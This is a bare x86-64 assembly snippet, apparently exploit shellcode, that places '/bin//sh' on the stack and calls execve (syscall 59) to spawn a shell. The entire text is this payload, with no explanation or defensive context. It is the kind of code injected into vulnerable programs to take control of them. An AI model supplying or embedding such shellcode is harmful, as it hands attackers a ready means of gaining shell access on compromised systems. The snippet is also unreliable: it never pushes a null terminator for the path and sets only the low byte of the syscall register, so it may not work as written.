BITS 64;

_start:
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, '/bin//sh'
    push rdi
    push rsp
    pop rdi
    mov al, 59
    syscall
